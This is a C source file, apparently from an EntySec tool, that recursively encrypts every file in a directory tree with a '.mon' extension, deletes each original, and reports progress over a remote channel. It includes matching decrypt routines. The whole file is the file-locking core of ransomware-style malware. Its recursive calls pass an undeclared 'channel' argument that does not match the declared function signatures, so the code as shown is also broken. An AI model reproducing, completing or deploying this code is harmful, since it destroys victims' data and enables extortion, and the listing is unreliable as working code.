/*
* MIT License
*
* Copyright (c) 2020-2022 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#include "evp.h"
#include "tools.h"
#include "channel.h"

char *extension = ".mon";

static int recursive_encrypt(char *path, char *key, char *iv)
{
    DIR *fd = opendir(path);

    if (fd == NULL)
        return -1;

    char *name, *target;
    FILE *resource, *result;

    struct dirent *dir;

    while ((dir = readdir(fd)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 &&
            strcmp(dir->d_name, "..") != 0 &&
            strstr(dir->d_name, extension) == NULL) {

            target = link_string(path, dir->d_name, 1);

            if (recursive_encrypt(channel, target, key, iv) < 0) {
                resource = fopen(target, "rb");

                if (resource != NULL) {
                    name = link_string(target, extension, 0);
                    result = fopen(name, "wb");

                    if (result != NULL) {
                        evp_encrypt(resource, result, key, iv);
                        delete_file(target);
                        fclose(result);
                    }

                    fclose(resource);
                    free(name);
                }
            }

            free(target);
        }
    }

    closedir(fd);
    return 0;
}

static int recursive_decrypt(char *path, char *key, char *iv)
{
    DIR *fd = opendir(path);

    if (fd == NULL)
        return -1;

    char *name, *target;
    FILE *resource, *result;

    struct dirent *dir;

    while ((dir = readdir(fd)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 &&
            strcmp(dir->d_name, "..") != 0) {

            target = link_string(path, dir->d_name, 1);

            if (recursive_decrypt(channel, target, key, iv) < 0) {
                resource = fopen(target, "rb");

                if (resource != NULL) {
                    name = remove_last(target, strlen(extension));
                    result = fopen(name, "wb");

                    if (result != NULL) {
                        evp_decrypt(resource, result, key, iv);
                        delete_file(target);
                        fclose(result);
                    }

                    fclose(resource);
                    free(name);
                }
            }

            free(target);
        }
    }

    closedir(fd);
    return 0;
}

int begin_encrypt(int channel, char *path, char *key, char *iv)
{
    DIR *fd = opendir(path);

    if (fd == NULL)
        return -1;

    char *name;
    struct dirent *dir;

    while ((dir = readdir(fd)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 &&
            strcmp(dir->d_name, "..") != 0 &&
            strstr(dir->d_name, extension) == NULL) {

            name = link_string("Encrypting ", dir->d_name, 0);
            name = link_string(name, "\n", 0);
            send_channel(channel, name);

            recursive_encrypt(dir->d_name, key, iv);
            free(name);
        }
    }

    closedir(fd);
    return 0;
}

int begin_decrypt(int channel, char *path, char *key, char *iv)
{
    DIR *fd = opendir(path);

    if (fd == NULL)
        return -1;

    char *name;
    struct dirent *dir;

    while ((dir = readdir(fd)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 &&
            strcmp(dir->d_name, "..") != 0) {

            name = link_string("Decrypting ", dir->d_name, 0);
            name = link_string(name, "\n", 0);
            send_channel(channel, name);

            recursive_decrypt(dir->d_name, key, iv);
            free(name);
        }
    }

    closedir(fd);
    return 0;
}
